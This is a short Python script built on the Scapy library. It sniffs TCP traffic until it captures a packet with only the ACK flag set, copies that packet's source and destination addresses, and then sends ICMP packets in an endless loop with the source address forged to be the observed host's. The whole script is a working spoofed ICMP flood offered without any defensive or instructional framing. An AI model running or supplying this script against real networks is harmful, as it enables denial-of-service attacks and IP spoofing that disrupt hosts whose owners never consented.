#! /usr/bin/env python
from scapy.all import *

# Identify the packet with the "ACK" flag
def stopfilter(x):
	if x[TCP].flags == 16:
		return True
	else:
		return False

# Sniff packets until we find the one with the "ACK" flag
packets = sniff(filter='tcp', stop_filter=stopfilter)

# Get the last packet we sniffed
packet = packets[-1]

# Get the source and destinations
src = packet[IP].src
dst = packet[IP].dst

# Bamboozle
while True:
	ans,unans = sr(IP(src=src, dst=dst)/ICMP())




